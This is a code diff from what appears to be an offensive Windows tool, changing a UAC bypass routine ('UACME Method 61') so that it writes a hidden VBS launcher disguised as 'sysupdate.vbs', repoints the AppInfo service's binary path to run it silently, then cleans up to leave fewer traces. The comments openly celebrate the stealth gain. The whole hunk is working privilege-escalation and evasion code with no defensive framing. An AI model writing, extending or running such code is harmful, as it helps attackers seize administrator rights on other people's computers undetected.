@@ -2785,27 +2785,47 @@ def bypass_uac_wsreset():
         return False
 
 def bypass_uac_appinfo_service():
-    """UAC bypass using AppInfo service manipulation (UACME Method 61)."""
+    """UAC bypass using AppInfo service manipulation (UACME Method 61) - VBS Edition."""
     if not WINDOWS_AVAILABLE:
         return False
     
     try:
         # This method involves manipulating the Application Information service
         # to bypass UAC by modifying service permissions
+        # ENHANCED: Uses VBS instead of CMD for stealth
         
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
             current_exe = f'python.exe "{current_exe}"'
         
-        # Method 1: Try to modify AppInfo service configuration
+        # Create VBS script for stealthy execution
+        vbs_script = f'''
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "{current_exe}", 0, False
+Set objShell = Nothing
+'''
+        
+        # Save VBS to temp directory
+        import tempfile
+        vbs_path = os.path.join(tempfile.gettempdir(), "sysupdate.vbs")
+        
+        try:
+            with open(vbs_path, 'w') as f:
+                f.write(vbs_script)
+        except Exception as e:
+            log_message(f"Failed to create VBS script: {e}")
+            return False
+        
+        # Method 1: Try to modify AppInfo service configuration with VBS
         try:
             # Stop AppInfo service temporarily
             subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
             
-            # Modify service binary path to include our payload
+            # Modify service binary path to use VBS instead of CMD
+            # VBS runs silently without console window - much stealthier!
             subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
-                          f'cmd.exe /c {current_exe} && svchost.exe -k netsvcs -p'], 
+                          f'wscript.exe //B //Nologo "{vbs_path}" && svchost.exe -k netsvcs -p'], 
                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
             
             # Start service
@@ -2819,9 +2839,20 @@ def bypass_uac_appinfo_service():
                           r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
             
+            # Cleanup VBS file
+            try:
+                os.remove(vbs_path)
+            except:
+                pass
+            
             return True
             
-        except:
+        except Exception as e:
+            # Cleanup VBS file on error
+            try:
+                os.remove(vbs_path)
+            except:
+                pass
             return False
             
     except Exception as e:
